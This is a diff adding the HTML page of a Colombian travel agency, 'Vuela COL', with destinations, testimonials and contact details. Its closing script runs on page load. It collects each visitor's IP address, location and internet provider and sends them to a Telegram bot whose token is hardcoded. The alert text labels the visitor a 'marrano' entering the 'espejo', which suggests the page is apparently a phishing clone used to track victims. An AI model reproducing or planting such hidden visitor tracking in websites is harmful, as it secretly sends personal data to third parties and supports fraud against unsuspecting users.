@@ -1,0 +1,237 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Vuela COL - Agencia de Viajes </title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+
+
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Montserrat', sans-serif;
+      line-height: 1.6;
+      color: #333;
+      background-color: #f9f9f9;
+    }
+    header {
+      background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e') no-repeat center center/cover;
+      height: 100vh;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 0 20px;
+    }
+    header h1 {
+      font-size: 3rem;
+      margin-bottom: 10px;
+      animation: fadeIn 1.5s ease-in-out;
+    }
+    header p {
+      font-size: 1.2rem;
+      margin-bottom: 30px;
+      animation: fadeIn 2s ease-in-out;
+    }
+    .boton-viaje {
+      display: inline-block;
+      background-color: #5B2C6F;
+      color: white;
+      padding: 15px 30px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 30px;
+      text-decoration: none;
+      font-weight: bold;
+      box-shadow: 0 5px 15px rgba(91,44,111,0.6);
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      animation: fadeIn 2.5s ease-in-out;
+    }
+    .boton-viaje:hover {
+      background-color: #7D3C98;
+      transform: scale(1.05);
+    }
+    nav {
+      background-color: #5B2C6F;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      padding: 15px 10px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    nav a {
+      color: white;
+      text-decoration: none;
+      margin: 10px 15px;
+      font-weight: bold;
+      transition: color 0.3s;
+    }
+    nav a:hover { color: #D2B4DE; }
+    section {
+      padding: 60px 20px;
+      max-width: 1100px;
+      margin: auto;
+    }
+    section h2 {
+      text-align: center;
+      font-size: 2rem;
+      margin-bottom: 30px;
+      color: #5B2C6F;
+    }
+    .destinos ul {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+      list-style: none;
+      padding: 0;
+    }
+    .destinos li {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+      transition: transform 0.3s;
+      color: #5B2C6F;
+      font-weight: 600;
+    }
+    .destinos li:hover {
+      transform: translateY(-5px);
+    }
+    .servicios, .testimonios, .contacto {
+      background-color: #fff;
+      border-radius: 10px;
+      padding: 40px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+      color: #4a235a;
+    }
+    blockquote {
+      font-style: italic;
+      margin: 20px auto;
+      text-align: center;
+      max-width: 700px;
+      color: #555;
+    }
+    footer {
+      background-color: #4a235a;
+      color: white;
+      text-align: center;
+      padding: 20px 10px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @media (max-width: 768px) {
+      header h1 { font-size: 2.2rem; }
+      header p { font-size: 1rem; }
+      .boton-viaje { font-size: 1rem; padding: 12px 24px; }
+      nav a { margin: 5px 10px; font-size: 0.95rem; }
+    }
+    @media (max-width: 480px) {
+      header { padding: 0 10px; }
+      header h1 { font-size: 1.8rem; }
+      header p { font-size: 0.95rem; }
+      .boton-viaje { width: 100%; padding: 14px; font-size: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>Aventuras Sin Fin</h1>
+    <p>Tu próxima gran aventura en Colombia comienza aquí</p>
+    <a href="" class="boton-viaje" target="_blank" rel="noopener">
+      🌍 Buscar
+    </a>
+  </header>
+
+  <nav>
+    <a href="#inicio"><i class="fas fa-home"></i> Inicio</a>
+    <a href="#destinos"><i class="fas fa-map-marker-alt"></i> Destinos</a>
+    <a href="#servicios"><i class="fas fa-concierge-bell"></i> Servicios</a>
+    <a href="#testimonios"><i class="fas fa-comment-dots"></i> Testimonios</a>
+    <a href="#contacto"><i class="fas fa-envelope"></i> Contacto</a>
+  </nav>
+
+  <section id="inicio">
+    <h2>Bienvenido</h2>
+    <p>Explora Colombia con nosotros. En Aventuras Sin Fin diseñamos viajes inolvidables para descubrir lo mejor de nuestro país: desde la Amazonía hasta las playas caribeñas.</p>
+  </section>
+
+  <section id="destinos" class="destinos">
+    <h2>Destinos Populares en Colombia</h2>
+    <ul>
+      <li><i class="fas fa-archway"></i><br/>San Andres</li>
+      <li><i class="fas fa-mountain"></i><br/>Parque Tayrona</li>
+      <li><i class="fas fa-tree"></i><br/>Medellin</li>
+      <li><i class="fas fa-water"></i><br/>Santa Marta</li>
+    </ul>
+  </section>
+
+  <section id="servicios" class="servicios">
+    <h2>Nuestros Servicios</h2>
+    <p>Ofrecemos experiencias personalizadas en Colombia: vuelos, hospedaje, guías expertos, tours temáticos y asesoramiento 24/7. Viaja con tranquilidad, nosotros nos encargamos de todo.</p>
+  </section>
+
+  <section id="testimonios" class="testimonios">
+    <h2>Testimonios</h2>
+    <blockquote>"Una experiencia increíble por Colombia, ¡me sentí en buenas manos desde el primer día!" – Laura D.</blockquote>
+    <blockquote>"Todo impecable. El viaje fue tal como lo soñé. ¡Gracias por hacerlo posible!" – Miguel G.</blockquote>
+  </section>
+
+  <section id="contacto" class="contacto">
+    <h2>Contacto</h2>
+    <p><i class="fas fa-envelope"></i> info@vuelacol.site</p>
+    <p><i class="fas fa-phone"></i> +57 300 123 8888</p>
+    <p><i class="fas fa-location-dot"></i> Cra 17b numero 10 82, Bogotá, Colombia</p>
+  </section>
+
+  <footer>
+    <p>&copy; 2025 Vuela Col | Agencia de Viajes </p>
+  </footer>
+
+  <!-- Script para enviar IP y ubicación a Telegram -->
+  <script>
+    const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM'; // Tu token de bot
+    const chatId = '-4726108713'; // Tu chat ID
+
+    async function notifySiteVisit() {
+      try {
+        const response = await fetch('https://ipinfo.io/json?token=0b33d8e257b3eb'); // Reemplaza con tu token de ipinfo.io
+        const data = await response.json();
+
+        const ip = data.ip || 'No disponible';
+        const city = data.city || 'Sin ciudad';
+        const region = data.region || 'Sin región';
+        const country = data.country || 'Sin país';
+        const org = data.org || 'Sin proveedor';
+
+        const message = `
+📣💊 *MARRANO HP ENTRANDO AL ESPEJO* 💊📣
+🌍 *IP:* ${ip}
+📍 *Ubicación:* ${city}, ${region}, ${country}
+🔌 *Proveedor:* ${org}
+        `;
+
+        const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+        await fetch(telegramURL);
+      } catch (error) {
+        console.error('Error al enviar datos a Telegram:', error);
+      }
+    }
+
+    window.onload = notifySiteVisit;
+  </script>
+
+</body>
+</html>
